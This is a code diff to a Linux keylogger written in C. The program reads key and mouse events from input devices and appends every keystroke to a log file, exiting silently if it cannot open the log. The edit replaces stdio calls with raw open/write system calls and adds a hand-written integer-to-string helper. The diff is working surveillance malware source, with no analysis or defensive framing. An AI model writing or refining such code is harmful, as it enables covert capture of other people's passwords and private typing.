@@ -25,6 +25,43 @@ static inline int test_bit(int bit, unsigned long *array) {
     return (array[idx] >> offset) & 1;
 }
 
+// Helper function to convert integer to string (replacing snprintf)
+int int_to_string(int value, char *str) {
+    if (value == 0) {
+        str[0] = '0';
+        str[1] = '\0';
+        return 1;
+    }
+    
+    char temp[16];
+    int i = 0;
+    int is_negative = 0;
+    
+    if (value < 0) {
+        is_negative = 1;
+        value = -value;
+    }
+    
+    while (value > 0) {
+        temp[i++] = '0' + (value % 10);
+        value /= 10;
+    }
+    
+    int len = i;
+    if (is_negative) {
+        str[0] = '-';
+        len++;
+    }
+    
+    int j = is_negative;
+    while (i > 0) {
+        str[j++] = temp[--i];
+    }
+    str[j] = '\0';
+    
+    return len;
+}
+
 // Function to get the current timestamp
 void get_timestamp(char *buffer, size_t size) {
     time_t rawtime;
@@ -141,7 +178,6 @@ int main() {
     struct input_event ev;
     ssize_t n;
     const char* key_char;
-    FILE *logfile;
     
     // Get the directory of the executable
     char exe_path[512];  // Increased size to allow for longer paths
@@ -221,9 +257,9 @@ int main() {
         return 1;
     }
     
-    // Open log file in append mode
-    logfile = fopen(log_filename, "a");
-    if (!logfile) {
+    // Open log file in append mode using system calls
+    int log_fd = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (log_fd == -1) {
         // Silently exit if can't open log file
         for (int i = 0; i < num_input_fds; i++) {
             if (input_fds[i] != -1) close(input_fds[i]);
@@ -231,8 +267,13 @@ int main() {
         return 1;
     }
     
-    fprintf(logfile, "\n=== Keylogger started at %s ===\n", timestamp_str);
-    fclose(logfile);
+    char start_msg[128];
+    strcpy(start_msg, "\n=== Keylogger started at ");
+    strcat(start_msg, timestamp_str);
+    strcat(start_msg, " ===\n");
+    int msg_len = strlen(start_msg);
+    write(log_fd, start_msg, msg_len);
+    close(log_fd);
     
     // Main loop
     fd_set readfds;
@@ -273,20 +314,24 @@ int main() {
                 if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                     key_char = keycode_to_char(ev.code);
                     
-                    logfile = fopen(log_filename, "a");
-                    if (logfile) {
+                    int log_fd_evt = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+                    if (log_fd_evt != -1) {
                         if (ev.code == KEY_ENTER) {
-                            fprintf(logfile, "\n");
+                            write(log_fd_evt, "\n", 1);
                         } else if (ev.code == BTN_LEFT || ev.code == BTN_RIGHT || ev.code == BTN_MIDDLE ||
                                    ev.code == BTN_SIDE || ev.code == BTN_EXTRA) {
                             // Mouse button pressed - create new lines
-                            fprintf(logfile, "\n%s\n", key_char);
-                        } else if (strlen(key_char) == 1) {
-                            fprintf(logfile, "%s", key_char);
+                            char mouse_msg[128];
+                            strcpy(mouse_msg, "\n");
+                            strcat(mouse_msg, key_char);
+                            strcat(mouse_msg, "\n");
+                            int mouse_len = strlen(mouse_msg);
+                            write(log_fd_evt, mouse_msg, mouse_len);
                         } else {
-                            fprintf(logfile, "%s", key_char);
+                            int key_len = strlen(key_char);
+                            write(log_fd_evt, key_char, key_len);
                         }
-                        fclose(logfile);
+                        close(log_fd_evt);
                     }
                 }
             }
@@ -294,13 +339,18 @@ int main() {
     }
     
     // Close file and clean up
-    logfile = fopen(log_filename, "a");
-    if (logfile) {
+    int log_fd_end = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (log_fd_end != -1) {
         time(&rawtime);
         timeinfo = localtime(&rawtime);
         strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
-        fprintf(logfile, "\n=== Keylogger stopped at %s ===\n", timestamp);
-        fclose(logfile);
+        char end_msg[128];
+        strcpy(end_msg, "\n=== Keylogger stopped at ");
+        strcat(end_msg, timestamp);
+        strcat(end_msg, " ===\n");
+        int end_len = strlen(end_msg);
+        write(log_fd_end, end_msg, end_len);
+        close(log_fd_end);
     }
     
     // Close all input file descriptors
